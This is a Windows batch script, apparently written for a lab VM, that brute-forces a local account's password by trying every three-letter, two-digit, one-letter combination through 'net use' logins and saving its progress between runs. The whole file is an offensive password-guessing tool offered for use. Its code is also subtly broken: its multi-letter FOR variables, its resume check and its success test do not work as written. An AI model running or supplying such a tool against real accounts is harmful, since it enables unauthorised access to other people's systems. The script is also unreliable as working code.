@echo off
title Sigma LLLNNL Password Grinder
setlocal enabledelayedexpansion

:: --- CONFIGURATION ---
set "state_file=sigma_state.txt"  :: stores last combo index
set "user=TARGET_USERNAME"        :: change to your VM user
set "letters=abcdefghijklmnopqrstuvwxyz"
set "numbers=0123456789"
set "count=0"
set "save_every=100"              :: save progress every N attempts

:: --- LOAD LAST COMBO INDEX ---
if exist "%state_file%" (
    set /p count=<"%state_file%"
)

:: --- FUNCTION: GENERATE COMBOS ---
:generate
for %%l1 in (%letters%) do (
  for %%l2 in (%letters%) do (
    for %%l3 in (%letters%) do (
      for %%n1 in (%numbers%) do (
        for %%n2 in (%numbers%) do (
          for %%l4 in (%letters%) do (
            set /a count+=1
            if !count! LEQ %count% (
              rem already done
            ) else (
              set "pass=%%l1%%l2%%l3%%n1%%n2%%l4"
              echo [ATTEMPT !count!] !pass!

              :: --- ATTEMPT LOGIN ---
              net use \\127.0.0.1 /user:%user% !pass! 2>nul | find "System error 1326" >nul
              if !errorlevel! EQU 1 (
                  echo [+] Password found: !pass!
                  pause
                  exit
              )

              :: --- SAVE PROGRESS ---
              if !count! GEQ 1 (
                  set /a mod=!count! %% %save_every%
                  if !mod! EQU 0 (
                      echo !count! > "%state_file%"
                  )
              )
            )
          )
        )
      )
    )
  )
)
echo Sigma grind complete!
pause
exit
